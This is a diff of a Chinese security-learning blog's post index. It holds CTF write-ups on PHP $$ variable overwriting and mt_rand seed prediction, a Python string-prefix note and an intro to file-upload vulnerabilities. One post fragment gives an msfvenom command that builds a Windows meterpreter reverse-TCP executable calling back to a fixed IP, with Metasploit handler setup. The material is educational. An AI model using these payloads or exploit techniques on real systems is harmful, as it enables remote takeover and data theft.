-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure>
-<p>需要POST一个名为flag的变量</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br></pre></td></tr></table></figure>
-<p>$$，变量覆盖<br>
-第一个foreach处，能将任意变量的值赋予任意变量<br>
-第二个foreach处，能将输入的值赋予任意变量</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">$_POST[&quot;flag&quot;]如果与$flag不完全相等，即值和类型都比较时，输出$_403</span><br><span class="line">如果完全相等，则输出$flag和$_200</span><br></pre></td></tr></table></figure>
-<p>显然flag不是这个1<br>
-看回上面的变量覆盖，<code>foreach ($_POST as $key =&gt; $value)$$key = $value;</code><br>
-当只POST一个值为1的变量flag，<code>$$key = $valu</code>=&gt;<code>$flag = 1</code>，使可能原本存在的变量$flag被赋值为1，即真实的flag被修改为变量flag的值，由于前面的两个if，这是无法被改变的<br>
-所以，需要在真实的flag被修改前将其值给其他变量并能输出出来<br>
-能输出的只有<code>die($_403);</code>和<code>die($_200);</code>，所以思路是利用变量覆盖在flag被改前将真实的<code>$flag</code>的值覆盖<code>$_403</code>或<code>$_200</code>并输出<br>
-而能利用变量覆盖将一个变量的值覆盖其他变量的地方只有第一个foreach处</p>
-<h1>知识点</h1>
-<h2 id="变量覆盖"><a class="header-anchor" href="#变量覆盖">¶</a>$$变量覆盖</h2>
-<p><img src="https://img-blog.csdnimg.cn/20210114171227699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1>解法</h1>
-<h2 id="200"><a class="header-anchor" href="#200">¶</a>$_200</h2>
-<p>将真实的flag覆盖<code>$_200</code>并输出<code>$_200</code><br>
-<img src="https://img-blog.csdnimg.cn/20210114171253839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_200&#39;]&#x3D;&#39;flag&#39;;</span><br><span class="line">$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
-<p>相当于<code>$_200=$flag</code>，将真flag给了<code>$_200</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">$flag被修改为1，与$_POST[&#39;flag&#39;]等值等类型，不满足$_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
-<p>输出<code>$_200</code>即输出真flag</p>
-<h2 id="403"><a class="header-anchor" href="#403">¶</a>$_403</h2>
-<p>将真实的flag覆盖<code>$_403</code>并构造使<code>$_403</code>能输出<br>
-<img src="https://img-blog.csdnimg.cn/20210114171311729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_403&#39;]&#x3D;flag&#96;&amp;&#96;$_GET[&quot;_POST[&#39;flag&#39;]&quot;]&#x3D;2&#96;</span><br><span class="line">&#96;$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
-<p>相当于<code>$_403=$flag</code>，将真flag给了<code>$_403</code>，以及<code>$_POST['flag']=$2</code>，<code>$2</code>不存在，即<code>$_POST['flag']</code>为空[实际代码应该会报错]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="variable">$flag</span>被修改为<span class="number">1</span>，与<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]不等，满足<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span>，输出<span class="variable">$_403</span></span><br></pre></td></tr></table></figure>
-]]></content>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>web技术学习</category>
-        <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php伪随机数漏洞</title>
-    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
-<a id="more"></a>
-<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
-<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
-<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
-<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
-<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
-<p>这张图能帮助我们更好的了解php伪随机数</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
-<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
-<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
-<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
-<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
-那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
-<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
-<p>kali下，进入目录，make</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
-<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
-<p>可以得到种子</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
-<p>验证种子是否一样就是看 输出的序列是否一样</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
-<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
-<p>平台：ctfshow    web入门  web25</p>
-<p>下面放出 此题的wp ：</p>
-<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
-<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>php伪随机数漏洞</category>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -998,6 +911,73 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>记一题php$$变量覆盖</title>
+    <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
+    <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
+<a id="more"></a>
+<h1>题目</h1>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$_403 &#x3D; &quot;Access Denied&quot;;</span><br><span class="line">$_200 &#x3D; &quot;Welcome Admin&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">    die(&quot;BugsBunnyCTF is here :p...&quot;);</span><br></pre></td></tr></table></figure>
+<p>请求方式需为POST</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br></pre></td></tr></table></figure>
+<p>需要POST一个名为flag的变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br></pre></td></tr></table></figure>
+<p>$$，变量覆盖<br>
+第一个foreach处，能将任意变量的值赋予任意变量<br>
+第二个foreach处，能将输入的值赋予任意变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">$_POST[&quot;flag&quot;]如果与$flag不完全相等，即值和类型都比较时，输出$_403</span><br><span class="line">如果完全相等，则输出$flag和$_200</span><br></pre></td></tr></table></figure>
+<p>显然flag不是这个1<br>
+看回上面的变量覆盖，<code>foreach ($_POST as $key =&gt; $value)$$key = $value;</code><br>
+当只POST一个值为1的变量flag，<code>$$key = $valu</code>=&gt;<code>$flag = 1</code>，使可能原本存在的变量$flag被赋值为1，即真实的flag被修改为变量flag的值，由于前面的两个if，这是无法被改变的<br>
+所以，需要在真实的flag被修改前将其值给其他变量并能输出出来<br>
+能输出的只有<code>die($_403);</code>和<code>die($_200);</code>，所以思路是利用变量覆盖在flag被改前将真实的<code>$flag</code>的值覆盖<code>$_403</code>或<code>$_200</code>并输出<br>
+而能利用变量覆盖将一个变量的值覆盖其他变量的地方只有第一个foreach处</p>
+<h1>知识点</h1>
+<h2 id="变量覆盖"><a class="header-anchor" href="#变量覆盖">¶</a>$$变量覆盖</h2>
+<p><img src="https://img-blog.csdnimg.cn/20210114171227699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1>解法</h1>
+<h2 id="200"><a class="header-anchor" href="#200">¶</a>$_200</h2>
+<p>将真实的flag覆盖<code>$_200</code>并输出<code>$_200</code><br>
+<img src="https://img-blog.csdnimg.cn/20210114171253839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_200&#39;]&#x3D;&#39;flag&#39;;</span><br><span class="line">$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
+<p>相当于<code>$_200=$flag</code>，将真flag给了<code>$_200</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($_POST as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">$flag被修改为1，与$_POST[&#39;flag&#39;]等值等类型，不满足$_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag</span><br><span class="line">echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br></pre></td></tr></table></figure>
+<p>输出<code>$_200</code>即输出真flag</p>
+<h2 id="403"><a class="header-anchor" href="#403">¶</a>$_403</h2>
+<p>将真实的flag覆盖<code>$_403</code>并构造使<code>$_403</code>能输出<br>
+<img src="https://img-blog.csdnimg.cn/20210114171311729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[&#39;_403&#39;]&#x3D;flag&#96;&amp;&#96;$_GET[&quot;_POST[&#39;flag&#39;]&quot;]&#x3D;2&#96;</span><br><span class="line">&#96;$_POST[&#39;flag&#39;]&#x3D;1;</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line">    $$key &#x3D; $$value;</span><br></pre></td></tr></table></figure>
+<p>相当于<code>$_403=$flag</code>，将真flag给了<code>$_403</code>，以及<code>$_POST['flag']=$2</code>，<code>$2</code>不存在，即<code>$_POST['flag']</code>为空[实际代码应该会报错]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line"><span class="variable">$flag</span>被修改为<span class="number">1</span>，与<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]不等，满足<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span>，输出<span class="variable">$_403</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ping命令执行及bypass</title>
     <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
     <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
@@ -1082,24 +1062,44 @@ file -f:报错出具体内容</p>
       </categories>
   </entry>
   <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
+    <title>php伪随机数漏洞</title>
+    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
 <a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
+<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
+<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
+<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
+<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
+<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
+那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
+<p>kali下，进入目录，make</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
+<p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+]]></content>
       <categories>
-        <category>编程学习</category>
-        <category>python</category>
+        <category>web技术学习</category>
+        <category>php伪随机数漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -1962,6 +1962,127 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
+    <title>文件上传漏洞</title>
+    <url>/2020/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>文件上传也是很常见的一种漏洞</p>
+<a id="more"></a>
+<h2 id="一、概述"><a class="header-anchor" href="#一、概述">¶</a>一、概述</h2>
+<h3 id="1-漏洞简介"><a class="header-anchor" href="#1-漏洞简介">¶</a>1.漏洞简介</h3>
+<p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
+<h3 id="2-漏洞原理"><a class="header-anchor" href="#2-漏洞原理">¶</a>2.漏洞原理</h3>
+<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
+<h3 id="3-漏洞危害"><a class="header-anchor" href="#3-漏洞危害">¶</a>3.漏洞危害</h3>
+<p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p>
